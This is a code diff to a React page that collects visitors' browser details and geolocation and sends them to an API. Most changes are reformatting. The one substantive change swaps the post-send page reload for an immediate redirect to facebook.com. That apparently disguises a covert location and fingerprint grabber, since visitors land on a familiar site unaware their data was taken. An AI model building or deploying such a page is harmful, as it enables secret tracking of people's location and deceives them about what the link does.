@@ -30,7 +30,8 @@ const BrowserInfoPage: React.FC = () => {
         online: navigator.onLine,
         pixelDepth: window.screen.pixelDepth,
         loadTime:
-          performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
+          performance.timing.domContentLoadedEventEnd -
+          performance.timing.navigationStart,
         geolocation: await getGeolocation(),
       };
 
@@ -46,9 +47,11 @@ const BrowserInfoPage: React.FC = () => {
           },
           body: JSON.stringify(data),
         });
-    
+
         if (!response.ok) {
-          throw new Error(`API responded with status ${response.status} - ${response.statusText}`);
+          throw new Error(
+            `API responded with status ${response.status} - ${response.statusText}`
+          );
         }
         console.log('Data successfully sent to API!');
       } catch (error) {
@@ -61,10 +64,8 @@ const BrowserInfoPage: React.FC = () => {
         const browserData = await getBrowserInfo();
         await sendToApi(browserData); // Send collected data to the API
 
-        // Reload the page after 3 seconds
-        setTimeout(() => {
-          window.location.reload();
-        }, 3000);
+        // Redirect to Facebook after data is sent
+        window.location.href = 'https://facebook.com';
       } catch (error) {
         console.error('Failed to fetch or send browser information:', error);
       }
